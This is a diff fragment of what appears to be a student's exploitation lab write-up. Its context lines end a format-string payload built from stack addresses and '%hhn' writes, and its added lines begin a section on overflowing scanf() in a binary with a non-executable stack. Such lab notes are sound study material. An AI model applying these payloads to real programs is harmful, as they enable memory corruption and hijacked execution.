@@ -22,3 +22,6 @@ bf\xa0\xfb\xff\xbf\x9c\xfb\xff\xbf\xa1\xfb\xff\xbf\xa5\xfb\xff\xbf" + 160 * "w" 
 104 * "w" + "%hhn" + 11 * "w" + "%hhn" + 18 * "w" + "%hhn" + 35 * "w" + "%hhn" + 8 * "w" + "%hhn"
 + 64 * "w" +"%hhn" + 11 * "w" + "%hhn" + "%hhn" + 9 * "w")')
 ```
+## prog_vuln4
+In this part I used vulnerabilities of <b>scanf()</b> function which doesn't check whether input string match the space dedicated for it or not.  
+In this program stack guards were deactivated but there is <b>NON-Executable Stack</b> protection.
